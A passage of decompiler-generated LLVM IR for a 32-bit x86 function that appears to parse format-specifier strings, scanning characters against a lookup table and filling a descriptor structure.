  br i1 %v15_804ea81, label %dec_label_pc_804e8f1, label %dec_label_pc_804ea89

dec_label_pc_804ea89:                             ; preds = %dec_label_pc_804ea7f
  %v1_804ea89 = add i32 %v0_804ea89, 1
  store i32 %v1_804ea89, i32* @edx, align 4
  %v1_804ea8a = inttoptr i32 %v1_804ea89 to i8*
  %v2_804ea8a = load i8, i8* %v1_804ea8a, align 1
  %v3_804ea8a = icmp eq i8 %v2_804ea8a, 0
  %v1_804ea8d = icmp eq i1 %v3_804ea8a, false
  br i1 %v1_804ea8d, label %dec_label_pc_804ea7f, label %dec_label_pc_804ea8f

dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea89, %dec_label_pc_804e8f1
  %v0_804eaa2 = phi i32 [ %v1_804e8f1, %dec_label_pc_804e8f1 ], [ %v0_804ea7f.pre.pre, %dec_label_pc_804ea89 ]
  %v0_804ea9f = phi i32 [ %v0_804ea89, %dec_label_pc_804e8f1 ], [ %v1_804ea89, %dec_label_pc_804ea89 ]
  %v1_804ea91 = add i32 %v0_804ea9f, -134548416
  %v1_804ea96 = add i32 %v0_804ea9f, -134548417
  %v5_804ea96 = sub i32 134548416, %v0_804ea9f
  %v6_804ea96 = and i32 %v1_804ea91, %v5_804ea96
  %v7_804ea96 = icmp slt i32 %v6_804ea96, 0
  %v8_804ea96 = icmp eq i32 %v1_804ea96, 0
  %v9_804ea96 = icmp slt i32 %v1_804ea96, 0
  store i32 %v1_804ea96, i32* %eax.global-to-local, align 4
  %v3_804ea97 = icmp eq i1 %v9_804ea96, %v7_804ea96
  %v4_804ea97 = icmp eq i1 %v8_804ea96, false
  %v5_804ea97 = and i1 %v4_804ea97, %v3_804ea97
  br i1 %v5_804ea97, label %dec_label_pc_804eaa3, label %dec_label_pc_804ea99

dec_label_pc_804ea99:                             ; preds = %dec_label_pc_804ea8f
  %v1_804ea99 = inttoptr i32 %v0_804eaa2 to i8*
  %v2_804ea99 = load i8, i8* %v1_804ea99, align 1
  %v3_804ea99 = zext i8 %v2_804ea99 to i32
  %v5_804ea99 = and i32 %v1_804ea96, -256
  %v6_804ea99 = or i32 %v3_804ea99, %v5_804ea99
  store i32 %v6_804ea99, i32* %eax.global-to-local, align 4
  %v3_804ea9b = inttoptr i32 %v0_804ea9f to i8*
  %v4_804ea9b = load i8, i8* %v3_804ea9b, align 1
  %v15_804ea9b = icmp eq i8 %v2_804ea99, %v4_804ea9b
  %v1_804ea9d = icmp eq i1 %v15_804ea9b, false
  br i1 %v1_804ea9d, label %dec_label_pc_804eaa3, label %dec_label_pc_804ea9f

dec_label_pc_804ea9f:                             ; preds = %dec_label_pc_804ea99
  %v1_804ea9f = add i32 %v0_804ea9f, 9
  store i32 %v1_804ea9f, i32* @edx, align 4
  %v1_804eaa2 = add i32 %v0_804eaa2, 1
  store i32 %v1_804eaa2, i32* @esi, align 4
  br label %dec_label_pc_804eaa3

dec_label_pc_804eaa3:                             ; preds = %dec_label_pc_804ea99, %dec_label_pc_804ea8f, %dec_label_pc_804ea9f
  %v4_804eaa7 = phi i32 [ %v6_804ea99, %dec_label_pc_804ea99 ], [ %v1_804ea96, %dec_label_pc_804ea8f ], [ %v6_804ea99, %dec_label_pc_804ea9f ]
  %v0_804eaa7 = phi i32 [ %v0_804eaa2, %dec_label_pc_804ea99 ], [ %v0_804eaa2, %dec_label_pc_804ea8f ], [ %v1_804eaa2, %dec_label_pc_804ea9f ]
  %v0_804eaa3 = phi i32 [ %v0_804ea9f, %dec_label_pc_804ea99 ], [ %v0_804ea9f, %dec_label_pc_804ea8f ], [ %v1_804ea9f, %dec_label_pc_804ea9f ]
  %v1_804eaa3 = add i32 %v0_804eaa3, 9
  %v2_804eaa3 = inttoptr i32 %v1_804eaa3 to i8*
  %v3_804eaa3 = load i8, i8* %v2_804eaa3, align 1
  %v4_804eaa3 = sext i8 %v3_804eaa3 to i32
  store i32 %v4_804eaa3, i32* %ebx.global-to-local, align 4
  %v1_804eaa7 = inttoptr i32 %v0_804eaa7 to i8*
  %v2_804eaa7 = load i8, i8* %v1_804eaa7, align 1
  %v3_804eaa7 = zext i8 %v2_804eaa7 to i32
  %v5_804eaa7 = and i32 %v4_804eaa7, -256
  %v6_804eaa7 = or i32 %v3_804eaa7, %v5_804eaa7
  store i32 %v6_804eaa7, i32* %eax.global-to-local, align 4
  %v2_804eaa9 = mul nsw i32 %v4_804eaa3, 256
  store i32 %v2_804eaa9, i32* %ebx.global-to-local, align 4
  %v4_804eaac = icmp eq i8 %v2_804eaa7, 0
  br i1 %v4_804eaac, label %dec_label_pc_804ec69, label %dec_label_pc_804eab4

dec_label_pc_804eab4:                             ; preds = %dec_label_pc_804eaa3
  %v3_804eab4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804eab4, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8050bfd.121 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804eabd

dec_label_pc_804eabd:                             ; preds = %dec_label_pc_804eb0d, %dec_label_pc_804eab4
  %v0_804eb0d = phi i32 [ %v1_804eb0d, %dec_label_pc_804eb0d ], [ ptrtoint ([21 x i8]* @global_var_8050bfd.121 to i32), %dec_label_pc_804eab4 ]
  %v3_804eabd = inttoptr i32 %v0_804eb0d to i8*
  %v4_804eabd = load i8, i8* %v3_804eabd, align 1
  %v15_804eabd = icmp eq i8 %v2_804eaa7, %v4_804eabd
  %v1_804eabf = icmp eq i1 %v15_804eabd, false
  br i1 %v1_804eabf, label %dec_label_pc_804eb0d, label %dec_label_pc_804eac1

dec_label_pc_804eac1:                             ; preds = %dec_label_pc_804eabd
  %v1_804eac3 = add i32 %v0_804eb0d, -134548477
  store i32 %v1_804eac3, i32* %edx.global-to-local, align 4
  %v7_804eacc = icmp sgt i32 %v1_804eac3, 17
  br i1 %v7_804eacc, label %dec_label_pc_804eace, label %dec_label_pc_804ead7

dec_label_pc_804eace:                             ; preds = %dec_label_pc_804eac1
  %v1_804eace = add i32 %v0_804eb0d, -134548479
  store i32 %v1_804eace, i32* %eax.global-to-local, align 4
  %v3_804ead1 = and i32 %v2_804eaa9, 1024
  %v4_804ead1 = icmp eq i32 %v3_804ead1, 0
  %v1_804ead4 = icmp eq i1 %v4_804ead1, false
  %v4_804ead4 = select i1 %v1_804ead4, i32 %v1_804eace, i32 %v1_804eac3
  store i32 %v4_804ead4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ead7

dec_label_pc_804ead7:                             ; preds = %dec_label_pc_804eac1, %dec_label_pc_804eace
  %v0_804eae0 = phi i32 [ %v1_804eac3, %dec_label_pc_804eac1 ], [ %v4_804ead4, %dec_label_pc_804eace ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8050bf3.122 to i32), i32* %ecx.global-to-local, align 4
  %v2_804eae0 = add i32 %tmp76, 32
  %v3_804eae0 = inttoptr i32 %v2_804eae0 to i32*
  store i32 %v0_804eae0, i32* %v3_804eae0, align 4
  %v0_804eae3.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804eae7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eae3

dec_label_pc_804eae3:                             ; preds = %dec_label_pc_804eae3, %dec_label_pc_804ead7
  %v0_804eae3 = phi i32 [ %v1_804eae3, %dec_label_pc_804eae3 ], [ %v0_804eae3.pre, %dec_label_pc_804ead7 ]
  %v1_804eae3 = add i32 %v0_804eae3, 1
  store i32 %v1_804eae3, i32* %ecx.global-to-local, align 4
  %v1_804eae4 = inttoptr i32 %v1_804eae3 to i8*
  %v2_804eae4 = load i8, i8* %v1_804eae4, align 1
  %v3_804eae4 = sext i8 %v2_804eae4 to i32
  store i32 %v3_804eae4, i32* %eax.global-to-local, align 4
  %v8_804eae9 = icmp sgt i32 %v0_804eae7.pre, %v3_804eae4
  br i1 %v8_804eae9, label %dec_label_pc_804eae3, label %dec_label_pc_804eaeb

dec_label_pc_804eaeb:                             ; preds = %dec_label_pc_804eae3
  store i32 ptrtoint ([21 x i8]* @global_var_8050bfd.121 to i32), i32* @ecx, align 4
  %v1_804eaf2 = add i32 %v0_804eae3, -134548467
  store i32 %v1_804eaf2, i32* %eax.global-to-local, align 4
  %v2_804eaf7 = add i32 %v0_804eae3, add (i32 ptrtoint (i32* @global_var_8050be4.123 to i32), i32 -134548467)
  %v3_804eaf7 = add i32 %v2_804eaf7, %v1_804eaf2
  %v4_804eaf7 = inttoptr i32 %v3_804eaf7 to i16*
  %v5_804eaf7 = load i16, i16* %v4_804eaf7, align 2
  %v6_804eaf7 = sext i16 %v5_804eaf7 to i32
  store i32 %v6_804eaf7, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804eaf2, 2
  %v3_804eaff = add i32 %factor, 134548436
  %v4_804eaff = inttoptr i32 %v3_804eaff to i16*
  %v5_804eaff = load i16, i16* %v4_804eaff, align 2
  %v6_804eaff = sext i16 %v5_804eaff to i32
  store i32 %v6_804eaff, i32* %eax.global-to-local, align 4
  %v1_804eb07 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb07 = or i32 %v1_804eb07, %v6_804eaf7
  %v2_804eb09 = and i32 %v2_804eb07, %v6_804eaff
  store i32 %v2_804eb09, i32* %edx.global-to-local, align 4
  %v0_804eb1b.pre = load i32, i32* @esi, align 4
  %v0_804eb1e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804eb13

dec_label_pc_804eb0d:                             ; preds = %dec_label_pc_804eabd
  %v1_804eb0d = add i32 %v0_804eb0d, 1
  store i32 %v1_804eb0d, i32* @ecx, align 4
  %v1_804eb0e = inttoptr i32 %v1_804eb0d to i8*
  %v2_804eb0e = load i8, i8* %v1_804eb0e, align 1
  %v3_804eb0e = icmp eq i8 %v2_804eb0e, 0
  %v1_804eb11 = icmp eq i1 %v3_804eb0e, false
  br i1 %v1_804eb11, label %dec_label_pc_804eabd, label %dec_label_pc_804eb13

dec_label_pc_804eb13:                             ; preds = %dec_label_pc_804eb0d, %dec_label_pc_804eaeb
  %v0_804eb1e = phi i32 [ %v0_804eb1e.pre, %dec_label_pc_804eaeb ], [ %storemerge4, %dec_label_pc_804eb0d ]
  %v0_804eb1b = phi i32 [ %v0_804eb1b.pre, %dec_label_pc_804eaeb ], [ %v0_804eaa7, %dec_label_pc_804eb0d ]
  %v0_804eb13 = phi i32 [ %v2_804eb09, %dec_label_pc_804eaeb ], [ %v3_804eab4, %dec_label_pc_804eb0d ]
  store i32 %v0_804eb13, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804eb1b = inttoptr i32 %v0_804eb1b to i8*
  %v2_804eb1b = load i8, i8* %v1_804eb1b, align 1
  %v3_804eb1b = sext i8 %v2_804eb1b to i32
  store i32 %v3_804eb1b, i32* %eax.global-to-local, align 4
  %v2_804eb1e = add i32 %tmp76, 4
  %v3_804eb1e = inttoptr i32 %v2_804eb1e to i32*
  store i32 %v0_804eb1e, i32* %v3_804eb1e, align 4
  %v0_804eb21 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb21 = load i32, i32* @edx, align 4
  %v2_804eb21 = add i32 %v1_804eb21, 12
  %v3_804eb21 = inttoptr i32 %v2_804eb21 to i32*
  store i32 %v0_804eb21, i32* %v3_804eb21, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804eb28 = load i32, i32* @edx, align 4
  %v1_804eb28 = add i32 %v0_804eb28, 28
  %v2_804eb28 = inttoptr i32 %v1_804eb28 to i32*
  store i32 1, i32* %v2_804eb28, align 4
  %v0_804eb2f = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb2f = load i32, i32* @edx, align 4
  %v2_804eb2f = add i32 %v1_804eb2f, 8
  %v3_804eb2f = inttoptr i32 %v2_804eb2f to i32*
  store i32 %v0_804eb2f, i32* %v3_804eb2f, align 4
  %v0_804eb32 = load i32, i32* %edi.global-to-local, align 4
  %v1_804eb3c = and i32 %v0_804eb32, -5
  %v0_804eb42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804eb42 = and i32 %v0_804eb42, 3840
  store i32 %v1_804eb42, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804eb4b = or i32 %v1_804eb42, %v1_804eb3c
  store i32 %v2_804eb4b, i32* @edi, align 4
  %v1_804eb4d = load i32, i32* @edx, align 4
  %v2_804eb4d = add i32 %v1_804eb4d, 20
  %v3_804eb4d = inttoptr i32 %v2_804eb4d to i32*
  store i32 48, i32* %v3_804eb4d, align 4
  %v0_804eb50 = load i32, i32* @edi, align 4
  %v1_804eb50 = load i32, i32* @edx, align 4
  %v2_804eb50 = add i32 %v1_804eb50, 16
  %v3_804eb50 = inttoptr i32 %v2_804eb50 to i32*
  store i32 %v0_804eb50, i32* %v3_804eb50, align 4
  %v0_804eb53 = load i32, i32* @ecx, align 4
  %v1_804eb53 = inttoptr i32 %v0_804eb53 to i8*
  %v2_804eb53 = load i8, i8* %v1_804eb53, align 1
  %v3_804eb53 = icmp eq i8 %v2_804eb53, 0
  %v1_804eb56 = icmp eq i1 %v3_804eb53, false
  br i1 %v1_804eb56, label %dec_label_pc_804eb6f, label %dec_label_pc_804eb58

dec_label_pc_804eb58:                             ; preds = %dec_label_pc_804eb13
  %v0_804eb58 = load i32, i32* @esi, align 4
  %v1_804eb58 = inttoptr i32 %v0_804eb58 to i8*
  %v2_804eb58 = load i8, i8* %v1_804eb58, align 1
  %v11_804eb58 = icmp eq i8 %v2_804eb58, 109
  %v1_804eb5b = icmp eq i1 %v11_804eb58, false
  br i1 %v1_804eb5b, label %dec_label_pc_804ec69, label %dec_label_pc_804eb61

dec_label_pc_804eb61:                             ; preds = %dec_label_pc_804eb58
  %v0_804eb61 = load i32, i32* @edx, align 4
  %v1_804eb61 = add i32 %v0_804eb61, 32
  %v2_804eb61 = inttoptr i32 %v1_804eb61 to i32*
  store i32 20, i32* %v2_804eb61, align 4
  %v0_804eb68 = load i32, i32* @edx, align 4
  %v1_804eb68 = add i32 %v0_804eb68, 28
  %v2_804eb68 = inttoptr i32 %v1_804eb68 to i32*
  store i32 0, i32* %v2_804eb68, align 4
  br label %dec_label_pc_804eb6f

dec_label_pc_804eb6f:                             ; preds = %dec_label_pc_804eb13, %dec_label_pc_804eb61
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ec0b, label %dec_label_pc_804eb7a

dec_label_pc_804eb7a:                             ; preds = %dec_label_pc_804eb6f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804ebf3 = add i32 %tmp76, 40
  %v4_804eb89 = add i32 %tmp76, 36
  %v1_804ebfc = add i32 %tmp76, 28
  %v2_804ebfc = inttoptr i32 %v1_804ebfc to i32*
  br label %dec_label_pc_804eb7c

dec_label_pc_804eb7c:                             ; preds = %dec_label_pc_804ebf7, %dec_label_pc_804eb7a
  %v0_804eb92 = phi i32 [ 0, %dec_label_pc_804eb7a ], [ %v1_804ebfb, %dec_label_pc_804ebf7 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804eb7a ], [ %stack_var_-88.5, %dec_label_pc_804ebf7 ]
  %v1_804eb7c = add i32 %v0_804eb92, -2
  %v6_804eb7c = sub i32 1, %v0_804eb92
  %v7_804eb7c = and i32 %v6_804eb7c, %v0_804eb92
  %v8_804eb7c = icmp slt i32 %v7_804eb7c, 0
  %v9_804eb7c = icmp eq i32 %v1_804eb7c, 0
  %v10_804eb7c = icmp slt i32 %v1_804eb7c, 0
  %v3_804eb7f = icmp eq i1 %v10_804eb7c, %v8_804eb7c
  %v4_804eb7f = icmp eq i1 %v9_804eb7c, false
  %v5_804eb7f = and i1 %v4_804eb7f, %v3_804eb7f
  br i1 %v5_804eb7f, label %dec_label_pc_804eb92, label %dec_label_pc_804eb81

dec_label_pc_804eb81:                             ; preds = %dec_label_pc_804eb7c
  %v0_804eb81 = load i32, i32* @esp, align 4
  %v2_804eb81 = mul i32 %v0_804eb92, 4
  %v3_804eb81 = add i32 %v2_804eb81, 68
  %v4_804eb81 = add i32 %v3_804eb81, %v0_804eb81
  %v5_804eb81 = inttoptr i32 %v4_804eb81 to i32*
  %v6_804eb81 = load i32, i32* %v5_804eb81, align 4
  store i32 %v6_804eb81, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804eb89 = trunc i32 %v6_804eb81 to i8
  %v5_804eb89 = add i32 %v4_804eb89, %v0_804eb92
  %v6_804eb89 = inttoptr i32 %v5_804eb89 to i8*
  store i8 %v1_804eb89, i8* %v6_804eb89, align 1
  %v0_804eb8d = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb8d = urem i32 %v0_804eb8d, 256
  br label %dec_label_pc_804eb9b

dec_label_pc_804eb92:                             ; preds = %dec_label_pc_804eb7c
  %v5_804eb94 = add i32 %v0_804eb92, %stack_var_-32.3
  store i32 %v5_804eb94, i32* %eax.global-to-local, align 4
  %v1_804eb98 = add i32 %v5_804eb94, -2
  br label %dec_label_pc_804eb9b

dec_label_pc_804eb9b:                             ; preds = %dec_label_pc_804eb81, %dec_label_pc_804eb92
  %v0_804ebae = phi i32 [ %v1_804eb8d, %dec_label_pc_804eb81 ], [ %v1_804eb98, %dec_label_pc_804eb92 ]
  store i32 %v0_804ebae, i32* %eax.global-to-local, align 4
  %v5_804eb9b = sub i32 %v0_804ebae, %stack_var_-88.4
  %v11_804eb9b = xor i32 %v0_804ebae, %stack_var_-88.4
  %v12_804eb9b = xor i32 %v5_804eb9b, %v0_804ebae
  %v13_804eb9b = and i32 %v12_804eb9b, %v11_804eb9b
  %v14_804eb9b = icmp slt i32 %v13_804eb9b, 0
  %v15_804eb9b = icmp eq i32 %v5_804eb9b, 0
  %v16_804eb9b = icmp slt i32 %v5_804eb9b, 0
  %v3_804eb9f = icmp ne i1 %v16_804eb9b, %v14_804eb9b
  %v4_804eb9f = or i1 %v15_804eb9b, %v3_804eb9f
  br i1 %v4_804eb9f, label %dec_label_pc_804ebae, label %dec_label_pc_804eba1

dec_label_pc_804eba1:                             ; preds = %dec_label_pc_804eb9b
  %v1_804eba1 = add i32 %v0_804ebae, -9
  %v6_804eba1 = sub i32 8, %v0_804ebae
  %v7_804eba1 = and i32 %v6_804eba1, %v0_804ebae
  %v8_804eba1 = icmp slt i32 %v7_804eba1, 0
  %v9_804eba1 = icmp eq i32 %v1_804eba1, 0
  %v10_804eba1 = icmp slt i32 %v1_804eba1, 0
  %v3_804eba4 = icmp eq i1 %v10_804eba1, %v8_804eba1
  %v4_804eba4 = icmp eq i1 %v9_804eba1, false
  %v5_804eba4 = and i1 %v4_804eba4, %v3_804eba4
  br i1 %v5_804eba4, label %dec_label_pc_804ec69, label %dec_label_pc_804ebae

dec_label_pc_804ebae:                             ; preds = %dec_label_pc_804eba1, %dec_label_pc_804eb9b
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804eb9b ], [ %v0_804ebae, %dec_label_pc_804eba1 ]
  %v1_804ebae = add i32 %v0_804ebae, -1
  store i32 %v1_804ebae, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ebb7 = load i32, i32* @esp, align 4
  %v1_804ebb7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ebb7 = mul i32 %v1_804ebb7, 4
  %v3_804ebb7 = add i32 %v0_804ebb7, 80
  %v4_804ebb7 = add i32 %v3_804ebb7, %v2_804ebb7
  %v5_804ebb7 = inttoptr i32 %v4_804ebb7 to i32*
  %v6_804ebb7 = load i32, i32* %v5_804ebb7, align 4
  store i32 %v6_804ebb7, i32* %edi.global-to-local, align 4
  %v2_804ebbb = mul i32 %v1_804ebae, 4
  %v4_804ebbb = add i32 %v4_804ebf3, %v2_804ebbb
  %v5_804ebbb = inttoptr i32 %v4_804ebbb to i32*
  %v6_804ebbb = load i32, i32* %v5_804ebbb, align 4
  store i32 %v6_804ebbb, i32* @eax, align 4
  %v9_804ebbf = icmp eq i32 %v6_804ebb7, 8
  br i1 %v9_804ebbf, label %dec_label_pc_804ebf7, label %dec_label_pc_804ebc4

dec_label_pc_804ebc4:                             ; preds = %dec_label_pc_804ebae
  %v9_804ebc4 = icmp eq i32 %v6_804ebbb, 8
  br i1 %v9_804ebc4, label %dec_label_pc_804ebe7, label %dec_label_pc_804ebc9

dec_label_pc_804ebc9:                             ; preds = %dec_label_pc_804ebc4
  %v12_804ebc9 = icmp eq i32 %v6_804ebbb, %v6_804ebb7
  br i1 %v12_804ebc9, label %dec_label_pc_804ebe7, label %dec_label_pc_804ebcd

dec_label_pc_804ebcd:                             ; preds = %dec_label_pc_804ebc9
  %v1_804ebcd = call i32 @_promoted_size(i32 %v1_804ebae)
  store i32 %v1_804ebcd, i32* %ebx.global-to-local, align 4
  %v0_804ebd4 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804ebd4, i32* @eax, align 4
  %v1_804ebd6 = call i32 @_promoted_size(i32 %v1_804ebae)
  %v2_804ebdb = sub i32 %v1_804ebcd, %v1_804ebd6
  %v8_804ebdb = xor i32 %v1_804ebcd, %v1_804ebd6
  %v9_804ebdb = xor i32 %v2_804ebdb, %v1_804ebcd
  %v10_804ebdb = and i32 %v9_804ebdb, %v8_804ebdb
  %v11_804ebdb = icmp slt i32 %v10_804ebdb, 0
  %v12_804ebdb = icmp eq i32 %v2_804ebdb, 0
  %v13_804ebdb = icmp slt i32 %v2_804ebdb, 0
  %v3_804ebdd = icmp ne i1 %v13_804ebdb, %v11_804ebdb
  %v4_804ebdd = or i1 %v12_804ebdb, %v3_804ebdd
  %v5_804ebdd = zext i1 %v4_804ebdd to i32
  store i32 %v5_804ebdd, i32* %eax.global-to-local, align 4
  %v1_804ebe3 = icmp eq i1 %v4_804ebdd, false
  br i1 %v1_804ebe3, label %dec_label_pc_804ebf7, label %dec_label_pc_804ebcd.dec_label_pc_804ebe7_crit_edge

dec_label_pc_804ebcd.dec_label_pc_804ebe7_crit_edge: ; preds = %dec_label_pc_804ebcd
  %v0_804ebe7.pre = load i32, i32* @esp, align 4
  %v1_804ebe7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ebe7

dec_label_pc_804ebe7:                             ; preds = %dec_label_pc_804ebcd.dec_label_pc_804ebe7_crit_edge, %dec_label_pc_804ebc9, %dec_label_pc_804ebc4
  %v1_804ebe7 = phi i32 [ %v1_804ebe7.pre, %dec_label_pc_804ebcd.dec_label_pc_804ebe7_crit_edge ], [ %v1_804ebb7, %dec_label_pc_804ebc9 ], [ %v1_804ebb7, %dec_label_pc_804ebc4 ]
  %v0_804ebe7 = phi i32 [ %v0_804ebe7.pre, %dec_label_pc_804ebcd.dec_label_pc_804ebe7_crit_edge ], [ %v0_804ebb7, %dec_label_pc_804ebc9 ], [ %v0_804ebb7, %dec_label_pc_804ebc4 ]
  %v2_804ebe7 = mul i32 %v1_804ebe7, 4
  %v3_804ebe7 = add i32 %v0_804ebe7, 80
  %v4_804ebe7 = add i32 %v3_804ebe7, %v2_804ebe7
  %v5_804ebe7 = inttoptr i32 %v4_804ebe7 to i32*
  %v6_804ebe7 = load i32, i32* %v5_804ebe7, align 4
  store i32 %v6_804ebe7, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebae, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804ebe7, i32* %v5_804ebbb, align 4
  br label %dec_label_pc_804ebf7

dec_label_pc_804ebf7:                             ; preds = %dec_label_pc_804ebcd, %dec_label_pc_804ebae, %dec_label_pc_804ebe7
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ebfb = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ebfb = add i32 %v0_804ebfb, 1
  store i32 %v1_804ebfb, i32* %ebp.global-to-local, align 4
  %v3_804ebfc = load i32, i32* %v2_804ebfc, align 4
  %v1_804ebff = add i32 %v3_804ebfc, 2
  store i32 %v1_804ebff, i32* %eax.global-to-local, align 4
  %v5_804ec04 = icmp slt i32 %v1_804ebfb, %v1_804ebff
  br i1 %v5_804ec04, label %dec_label_pc_804eb7c, label %dec_label_pc_804ec32

dec_label_pc_804ec0b:                             ; preds = %dec_label_pc_804eb6f
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ec0f = add i32 %tmp76, 38
  %v2_804ec0f = inttoptr i32 %v1_804ec0f to i8*
  store i8 1, i8* %v2_804ec0f, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ec18 = add i32 %tmp76, 28
  %v2_804ec18 = inttoptr i32 %v1_804ec18 to i32*
  %v3_804ec18 = load i32, i32* %v2_804ec18, align 4
  %v2_804ec1b = mul i32 %v3_804ec18, 4
  %v2_804ec1f = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ec26 = add i32 %tmp76, 40
  store i32 %v1_804ec26, i32* %eax.global-to-local, align 4
  %v3_804ec2a = inttoptr i32 %v1_804ec26 to i16*
  %v4_804ec2a = call i32 @memcpy(i16* %v3_804ec2a, i32 %v2_804ec1f, i32 %v2_804ec1b)
  store i32 %v4_804ec2a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec32

dec_label_pc_804ec32:                             ; preds = %dec_label_pc_804ebf7, %dec_label_pc_804ec0b
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ec0b ], [ %stack_var_-88.5, %dec_label_pc_804ebf7 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804ec3a = inttoptr i32 %v1_804e8db to i8*
  %v3_804ec3a = load i8, i8* %v2_804ec3a, align 1
  %v5_804ec3a = icmp slt i8 %v3_804ec3a, 0
  store i32 %stack_var_-88.6, i32* %v2_804e8d4, align 4
  br i1 %v5_804ec3a, label %dec_label_pc_804ec4a, label %dec_label_pc_804ec43

dec_label_pc_804ec43:                             ; preds = %dec_label_pc_804ec32
  %v0_804ec43 = load i32, i32* @esi, align 4
  %v1_804ec43 = add i32 %v0_804ec43, 1
  store i32 %v1_804ec43, i32* %eax.global-to-local, align 4
  %v1_804ec46 = load i32, i32* @ecx, align 4
  %v2_804ec46 = inttoptr i32 %v1_804ec46 to i32*
  store i32 %v1_804ec43, i32* %v2_804ec46, align 4
  br label %dec_label_pc_804ec5d

dec_label_pc_804ec4a:                             ; preds = %dec_label_pc_804ec32
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804e8a8, i32* %edx.global-to-local, align 4
  %v0_804ec52 = load i32, i32* @esi, align 4
  %v2_804ec52 = sub i32 %v0_804ec52, %v4_804e8a8
  store i32 %v2_804ec52, i32* %esi.global-to-local, align 4
  %v1_804ec54 = mul i32 %v2_804ec52, 4
  %v2_804ec54 = add i32 %v1_804ec54, 224
  store i32 %v2_804ec54, i32* %eax.global-to-local, align 4
  %v2_804ec5b = load i32, i32* %arg1, align 4
  %v4_804ec5b = add i32 %v2_804ec5b, %v2_804ec54
  store i32 %v4_804ec5b, i32* %arg1, align 4
  br label %dec_label_pc_804ec5d

dec_label_pc_804ec5d:                             ; preds = %dec_label_pc_804ec43, %dec_label_pc_804ec4a
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ec61 = add i32 %tmp76, 28
  %v2_804ec61 = inttoptr i32 %v1_804ec61 to i32*
  %v3_804ec61 = load i32, i32* %v2_804ec61, align 4
  store i32 %v3_804ec61, i32* %eax.global-to-local, align 4
  %v1_804ec64 = add i32 %v3_804ec61, 2
  br label %dec_label_pc_804ec6c

dec_label_pc_804ec69:                             ; preds = %dec_label_pc_804e8f9, %dec_label_pc_804e993, %dec_label_pc_804e9c6, %dec_label_pc_804ea41, %dec_label_pc_804ea2d, %dec_label_pc_804ea24, %dec_label_pc_804eba1, %dec_label_pc_804eb58, %dec_label_pc_804eaa3
  br label %dec_label_pc_804ec6c

dec_label_pc_804ec6c:                             ; preds = %dec_label_pc_804ec5d, %dec_label_pc_804ec69
  %storemerge6 = phi i32 [ %v1_804ec64, %dec_label_pc_804ec5d ], [ -1, %dec_label_pc_804ec69 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ec6f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ec6f, i32* @ebx, align 4
  store i32 %v0_804e8a7, i32* @esi, align 4
  store i32 %v0_804e8a6, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804ebfb, { 0, 2, 1 }
  uselistorder i32 %v2_804ebdb, { 1, 2, 0 }
  uselistorder i32 %v1_804ebcd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804ebae, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804eba1, { 1, 0 }
  uselistorder i32 %v5_804eb9b, { 1, 2, 0 }
  uselistorder i32 %v0_804ebae, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804eb7c, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804eb92, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804eb0d, { 1, 2, 0 }
  uselistorder i32 %v1_804eae3, { 1, 2, 0 }
  uselistorder i32 %v0_804eb0d, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804eaa9, { 1, 0 }
  uselistorder i32 %v1_804ea96, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804ea9f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804ea89, { 0, 2, 3, 1 }
